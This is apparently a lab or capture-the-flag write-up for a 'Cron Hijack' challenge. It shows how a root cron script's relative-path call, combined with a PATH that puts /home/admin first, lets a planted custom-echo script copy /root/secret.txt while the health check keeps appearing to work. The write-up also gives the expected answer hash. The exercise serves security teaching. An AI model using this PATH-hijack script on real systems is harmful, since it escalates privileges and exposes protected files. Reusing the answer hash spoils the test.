## "Amsterdam": Cron Hijack

### Problem

Description: You are logged in as the user admin. A cron job (not a systemd timer) appears to be running as root every minute, related to a health check.
This server has as root's path /home/admin:/usr/local/bin:/usr/bin:/bin

Your mission is to find the running cron job, and use it to exploit the server so you can read the secret file at /root/secret.txt

Save the secret string from the secret file to the file /home/admin/solution.txt.

Test: cat /home/admin/solution.txt displays the same string that is in /root/secret.txt, with md5sum /home/admin/solution.txt returning c6ef5d3ea5e937ae56f8635f91cc727a (the solution string without an ending newline is also accepted)

### Solution

#### 1. find the path of the cron job via log

```
$ journalctl
Apr 19 21:01:01 i-0d07cc7a533c0c56d CRON[1680]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
Apr 19 21:01:01 i-0d07cc7a533c0c56d CRON[1682]: (root) CMD (/opt/scripts/health-check.sh)
Apr 19 21:01:01 i-0d07cc7a533c0c56d CRON[1680]: pam_unix(cron:session): session closed for user root
Apr 19 21:02:01 i-0d07cc7a533c0c56d CRON[1693]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
Apr 19 21:02:01 i-0d07cc7a533c0c56d CRON[1695]: (root) CMD (/opt/scripts/health-check.sh)
Apr 19 21:02:01 i-0d07cc7a533c0c56d CRON[1693]: pam_unix(cron:session): session closed for user root
```

#### 2. check the cronjob script

VULNERABILITY: We can write our own custom-echo in `/home/admin` and the script will execute `/home/admin/custom-echo` since this server has as root's path `/home/admin:/usr/local/bin:/usr/bin:/bin` (the will search the executable in `/home/admin` first)

```
admin@i-0d07cc7a533c0c56d:/opt/scripts$ ls -alt health-check.sh 
-rwxr-xr-x 1 root root 91 Apr  4 18:21 health-check.sh
admin@i-0d07cc7a533c0c56d:/opt/scripts$ cat health-check.sh 
#!/bin/bash
# VULNERABILITY: Relative path command
custom-echo "OK" >> /var/log/health.log
```

#### 3. write our own custom-echo

Co-pilot: Free version of Grok

```sh
# 1. Create the malicious custom-echo that runs as root
cat > /home/admin/custom-echo << 'EOF'
#!/bin/sh
# This runs as root via the cron job's PATH hijack
cat /root/secret.txt > /home/admin/solution.txt
chmod 644 /home/admin/solution.txt
# Optional: also call the real command so the health check still "works"
if [ -x /usr/local/bin/custom-echo ]; then
    /usr/local/bin/custom-echo "$@"
elif [ -x /usr/bin/custom-echo ]; then
    /usr/bin/custom-echo "$@"
else
    echo "OK" "$@"
fi
EOF

# 2. Make it executable
chmod 755 /home/admin/custom-echo
```
